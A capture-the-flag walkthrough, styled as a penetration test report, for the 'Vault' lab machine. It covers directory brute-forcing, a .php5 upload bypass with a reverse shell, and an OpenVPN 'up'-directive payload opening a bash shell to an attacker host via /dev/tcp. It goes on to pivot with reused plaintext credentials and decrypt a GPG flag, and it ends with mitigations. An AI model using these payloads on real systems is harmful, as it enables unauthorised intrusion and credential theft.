# Vault Penetration Test Report
## Executive Summary

This comprehensive penetration test against target `10.129.26.16` revealed a critical vulnerability chain leading to complete network compromise. The attack path progressed from web application exploitation through internal network pivoting to ultimate domain dominance.

## Initial Reconnaissance

### Network Mapping
```bash
# Set target variable
export target=10.129.26.16

# Comprehensive port scan - TCP connect scan
sudo nmap -p- --min-rate 1000 -sT -vvv $target

# Results:
# Discovered open ports: 22/tcp, 80/tcp
```

<img width="438" height="181" alt="image" src="https://github.com/user-attachments/assets/3bb658b3-4932-49be-b076-cc4801f56837" />

<img width="902" height="674" alt="image" src="https://github.com/user-attachments/assets/f4f67855-6bed-41d2-991d-5ffe873a7251" />

### Service Enumeration
```bash
# Detailed service scan on discovered ports
sudo nmap -sC -sV -p 22,80 -T4 $target

# Results:
# Port 22: OpenSSH 7.6p1 Ubuntu
# Port 80: Apache httpd 2.4.29
```

<img width="770" height="383" alt="image" src="https://github.com/user-attachments/assets/3bbc418f-a231-4c48-9b3e-09611bc4e864" />

---

## Web Application Enumeration

### Manual Exploration
- Visited `http://10.129.26.16/`

<img width="949" height="230" alt="image" src="https://github.com/user-attachments/assets/6de7dcf6-9df0-45b0-9507-517e172a85ac" />

- Discovered references to "sparklays" in page content
- Manual check of `http://10.129.26.16/sparklays/` - Directory exists!

### Systematic Directory Bruteforcing
```bash
# First-level directory scanning
gobuster dir -u http://10.129.26.16/sparklays \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50 2>/dev/null

# Discovered: /design/ directory

# Second-level directory scanning
gobuster dir -u http://10.129.26.16/sparklays/design \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50 2>/dev/null
```

<img width="949" height="453" alt="image" src="https://github.com/user-attachments/assets/1f719494-d2cd-4e3b-98af-33c7f185444b" />

<img width="949" height="453" alt="image" src="https://github.com/user-attachments/assets/0d6f87cd-cbe5-4631-9820-590312a2c717" />

### Discovered Endpoints:
- `http://10.129.26.16/sparklays/design/uploads/` - File upload directory
- `http://10.129.26.16/sparklays/design/design.html` - Design management interface
- `http://10.129.26.16/sparklays/design/changelogo.php` - Logo upload functionality

<img width="565" height="179" alt="image" src="https://github.com/user-attachments/assets/3bcf1ff6-a36c-43d4-a1ce-85760bb10c2b" />

<img width="608" height="173" alt="image" src="https://github.com/user-attachments/assets/a5477afa-ce3c-45e4-9035-c1cfb63147e5" />

---

## File Upload Vulnerability Exploitation

### Vulnerability Analysis
- Accessed `http://10.129.26.16/sparklays/design/design.html`
- Clicked "Change logo" → Redirected to `changelogo.php`
- File upload functionality identified
- Tested various PHP extensions: `.php`, `.php3`, `.phtml`, `.php4`, `.php5`
- **Finding**: `.php5` extension bypassed filters

<img width="658" height="181" alt="image" src="https://github.com/user-attachments/assets/c9fec78f-ba13-4239-bb70-cd809ccd9811" />

### Reverse Shell Deployment
```bash
# Created PHP reverse shell (modified from pentestmonkey)
# Saved as revshell.php5 with attacker IP: 10.10.14.90, port: 9001

# Start netcat listener
nc -nlvp 9001

# Upload shell through web interface
# Success message received: "File uploaded successfully"

# Trigger shell execution
curl http://10.129.26.16/sparklays/design/uploads/revshell.php5
```

<img width="929" height="383" alt="image" src="https://github.com/user-attachments/assets/8d97ea97-94c1-4a05-a399-5d9087b5bf0d" />

**Result**: Reverse shell connection established as `www-data` user

---

## Initial Foothold & Internal Discovery

### Initial Enumeration
```bash
# Basic system reconnaissance
whoami
# www-data

hostname
# ubuntu

pwd
# /var/www/html/sparklays/design/uploads

# Explore user directories
ls -la /home/
# Found user: dave

cd /home/dave/Desktop
ls -la
```

### Critical Data Discovery
```bash
# Found three important files:
cat Servers
# DNS + Configurator - 192.168.122.4
# Firewall - 192.168.122.5
# The Vault - x

cat key
# itscominghome

cat ssh
# dave
# Dav3therav3123
```

<img width="496" height="305" alt="image" src="https://github.com/user-attachments/assets/12217ec1-4f01-469e-a000-0ca91956994c" />

### Internal Network Scanning
```bash
# Scan internal DNS server from compromised host
for i in $(seq 1 1000); do 
  (nc -nzv 192.168.122.4 ${i} 2>&1 | grep -v "Connection refused" &); 
done

# Results: Ports 22 and 80 open on 192.168.122.4
```

<img width="944" height="127" alt="image" src="https://github.com/user-attachments/assets/5ad56c52-6ed3-4892-bbbe-038601b7df6a" />

---

## SSH Tunneling & Internal Service Access

### Port Forwarding Setup
```bash
# From attacker machine, establish SSH tunnel
ssh -L 80:192.168.122.4:80 dave@10.129.26.16
# Password: Dav3therav3123
```

<img width="549" height="328" alt="image" src="https://github.com/user-attachments/assets/aef0e875-b1ba-4018-895d-e2e3994a9b66" />

### Internal Web Application Assessment
- Accessed `http://127.0.0.1:80` in browser

<img width="661" height="223" alt="image" src="https://github.com/user-attachments/assets/03c1c1ef-848d-4e38-bcdf-0d3ba83e3163" />

- Discovered DNS configuration interface
- **VPN Configuration Page**: `http://127.0.0.1/vpnconfig.php`

<img width="513" height="527" alt="image" src="https://github.com/user-attachments/assets/6e79cae3-a7e0-4530-b2b4-9f95a87b2b0c" />

- OpenVPN configuration file upload functionality identified

---

## OpenVPN Configuration Injection

### OpenVPN Reverse Shell Research
- Researched OpenVPN configuration exploits
- Found technique for command execution via `up` directive
- Reference: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da

### Malicious OVPN Configuration
```openvpn
# Malicious OpenVPN configuration
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
nobind
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/1337 0<&1 2>&1&'"
```

### Shell Execution
```bash
# Start listener for DNS server shell
nc -nlvp 1337

# Upload malicious .ovpn file through web interface
# Shell connection established as root on DNS server!
```

<img width="665" height="539" alt="image" src="https://github.com/user-attachments/assets/92923731-7506-43af-9439-9f70d0a465a0" />

---

## DNS Server Compromise

### DNS Server Enumeration
```bash
whoami
# root

hostname
# DNS

# Locate user flag
find / -name user.txt 2>/dev/null
cat /home/dave/user.txt
# a4947faa8d4e1f80771d34234bd88c73

# Discover additional credentials
cat /home/dave/ssh
# dave
# dav3gerous567
```

### Network Route Discovery
```bash
# Check network configuration
route -n
# Found route to 192.168.5.0/24 via 192.168.122.5

cat /etc/hosts
# Found entry: vault 192.168.5.2

# Test connectivity
ping vault
# Packet loss - routing issue identified
```

<img width="679" height="241" alt="image" src="https://github.com/user-attachments/assets/1b8848f8-0655-41df-8615-7054757cb2f8" />

---

## Network Pivoting to The Vault

### Network Configuration Adjustment
```bash
# Add correct IP address to interface
ip address add 192.168.5.137/24 dev ens3

# Remove incorrect route
route del -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5

# Verify connectivity
ping -c 2 192.168.5.2
# Success!
```

<img width="734" height="313" alt="image" src="https://github.com/user-attachments/assets/22e127dd-4d71-4dda-8f50-b9c70b6a4947" />

### Vault Service Discovery
```bash
# Port scan The Vault
for i in $(seq 1 1000); do 
  (nc -nzv 192.168.5.2 ${i} 2>&1 | grep -v "Connection refused" &); 
done

# Results: Port 987 open (non-standard SSH)
```

<img width="947" height="98" alt="image" src="https://github.com/user-attachments/assets/711c5fc9-0954-4ab2-8806-157d49d3596a" />

---

## Vault System Breach

### SSH Access to The Vault
```bash
# Connect using discovered credentials
ssh dave@vault -p 987
# Password: dav3gerous567

# Successfully logged into The Vault system
```

<img width="521" height="334" alt="image" src="https://github.com/user-attachments/assets/737da9bb-01b2-4558-bf29-dc2809000797" />


### Flag Discovery & Extraction
```bash
# Search for root flag
find / -name root* 2>/dev/null
# Found: /root/root.txt.gpg (encrypted)

# As dave user, cannot directly read /root/ files
# Need to transfer encrypted file for decryption

# From DNS server, transfer the file
scp -P 987 dave@192.168.5.2:~/root.txt.gpg /dev/shm/
```

<img width="963" height="565" alt="image" src="https://github.com/user-attachments/assets/2ecb4c16-2ed3-4271-a5de-90fdd9cb35f9" />

---

## GPG Decryption & Final Flag

### File Transfer via Base64
```bash
# On DNS server, encode the file
cd /dev/shm
base64 -w0 root.txt.gpg
# [Long base64 string output]

# On initial compromised host (dave@ubuntu)
echo "hQIMA8d4xhDR6x8DARAAoJjq0xo2bn5JfY3Q6EMVZjkwUK7JPcwUEr1RNUx98k41oOFdtugxUjwHSZ9x9BU9sph696HhlKlPO0au7DeFyxqPFbjR2CdwoT9PBf8vuSEzEqVltvAq31jQbXpUSA2AxYSj3fWKCAkIPcUBTTcJAnac0EMmXlAQzdAmvFEU+9BRkcpJDSpYV8W2IQf+fsnh14hcc5tXZQZX0mPtLlwYVlJq4xgpV3znnJrrlUgKJqkqhq1i2/JEAL5Ul1k5as9Ha1N8KffjmfEsrRQl8TS5NLoC3mVp3w90X0LYhyDcRz7HPzXfdPMdM+G9NEX1zY4c6cr1sxOdLcpUwbZ4itd7XjCA71B23Ncd7eniLGCkErDaVkZh8oa4DyIG78bxqFTDgk6XrH6pz9XRXhDBSZnCezI90WkbxGecOB42cAOwGkuHcnSF44eXDT60Yl9h6bvRZVEQF3/39ee+nMaW5b5PnWzGb/PC4kT3ZDeWYSiloF6a5sOwDO2CL/qipnAFPj8UthhrCCcQj4rRH2zeeh4y9fh3m3G37Q+U9lNgpjzj0nzVCfjdrMRvUs5itxwpjwaxN6q2q1kxe1DhPCzaAHhLT7We7p2hxdSj1yPgefSzJ39GENgJI1fbTDEaMzwkPra4I2MiJCEVgZnV29oRHPYrmGsfx4tSkBy6tJW342/s88fSZAFwRHa6C9Hrr7GSVucoJ5z2kNKAPnS/cUmBc3OdeJlMxdfzQTMucmv89wwgNgKNLO6wmSFppVRnpmLE+AFoCEqg/JS91N5mVhZPkHwW6V94CxMF/3xqTMKpzBfdERq0MGYij98=" | base64 -d > root.txt.gpg
```

<img width="955" height="839" alt="image" src="https://github.com/user-attachments/assets/3c95aaf9-b253-40a5-866a-24eaa5b4ec78" />

### GPG Decryption
```bash
# Attempt decryption with various passphrases
gpg -d root.txt.gpg

# When prompted for passphrase, tried:
# - dav3gerous567 (failed)
# - Dav3therav3123 (failed)
# - itscominghome (SUCCESS!)

cat root.txt
# ca468370b91d1f5906e31093d9bfe819
```


---

## Attack Path Summary

1. **External Recon** → Port 80 web service
2. **Directory Enumeration** → /sparklays/design/ discovered
3. **File Upload Bypass** → .php5 extension accepted
4. **Reverse Shell** → www-data access gained
5. **Credential Discovery** → dave user credentials found
6. **Internal Network Mapping** → DNS server identified
7. **SSH Tunneling** → Internal service access achieved
8. **OpenVPN Injection** → Root on DNS server
9. **Network Pivoting** → The Vault system accessed
10. **Lateral Movement** → Vault compromised via SSH
11. **Data Exfiltration** → Encrypted flag transferred
12. **Decryption** → Final root flag obtained

---

## Critical Vulnerabilities Identified

### 1. Unrestricted File Upload (Critical)
- **Location**: `/sparklays/design/changelogo.php`
- **Impact**: Remote code execution
- **Root Cause**: Insufficient file extension validation

### 2. OpenVPN Configuration Injection (Critical)
- **Location**: Internal DNS configurator
- **Impact**: Privilege escalation to root
- **Root Cause**: Lack of input sanitization

### 3. Weak Credential Management (High)
- **Impact**: Lateral movement enabled
- **Examples**: Reused passwords, plaintext storage

### 4. Network Segmentation Failure (High)
- **Impact**: Internal network exposure
- **Root Cause**: Improper firewall rules

### 5. Cryptographic Weakness (Medium)
- **Impact**: Encrypted data compromise
- **Root Cause**: Weak GPG passphrase

---

## Mitigation Recommendations

### Immediate Actions (Critical)
1. **Patch File Upload Vulnerability**
   - Implement strict file type verification
   - Use allow-list approach for extensions
   - Store files outside web root with random names

2. **Secure OpenVPN Configuration**
   - Validate configuration files before processing
   - Restrict script execution in OpenVPN context
   - Implement digital signatures for configs

3. **Credential Reset & Management**
   - Reset all discovered passwords immediately
   - Implement password complexity requirements
   - Deploy multi-factor authentication

### Medium-term Improvements
4. **Network Segmentation**
   - Implement proper DMZ architecture
   - Restrict internal service access
   - Deploy network monitoring

5. **Application Hardening**
   - Regular security testing
   - Web Application Firewall deployment
   - Input validation frameworks

### Long-term Strategy
6. **Security Awareness**
   - Developer security training
   - Secure coding practices
   - Incident response planning

7. **Continuous Monitoring**
   - SIEM implementation
   - Regular penetration testing
   - Vulnerability management program

---

### Tools Utilized

* **Nmap**: Port scanning and network enumeration
* **Gobuster**: Directory brute-forcing on web servers
* **Netcat**: Reverse shell setup and simple TCP listener
* **SSH**: Secure tunneling and remote access
* **OpenVPN**: Configuration injection through malicious `.ovpn` file uploads
* **GPG**: File decryption and encryption handling
* **SCP**: Secure file transfer over SSH

---

**Testing Methodology**: OSSTMM compliant  
**Risk Rating**: Critical  
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00c8ff; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00c8ff; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00c8ff; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00c8ff; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00c8ff; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00c8ff; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00c8ff; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00c8ff; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00c8ff; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00c8ff; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
